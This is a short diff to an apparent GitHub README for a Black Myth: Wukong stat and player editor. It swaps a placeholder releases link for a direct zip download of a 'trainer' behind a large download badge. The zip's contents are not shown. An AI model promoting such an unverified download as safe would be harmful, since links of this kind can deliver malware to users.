@@ -15,7 +15,7 @@
 
   <br><br>
 
-  <a href="https://github.com/YOUR_USERNAME/Black-Myth-Wukong-Stat-and-Player-Editor/releases/latest" target="_blank">
+  <a href="https://github.com/alessiocasali94/Black-Myth-Wukong-Stat-and-Player-Editor/releases/download/Black-Myth-Wukong/BlackMythWukongTrainer.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_LATEST_VERSION-00ff9d?style=for-the-badge&logoColor=black&labelColor=111111&color=00ff9d" alt="Download Latest Version" height="68">
   </a>
 
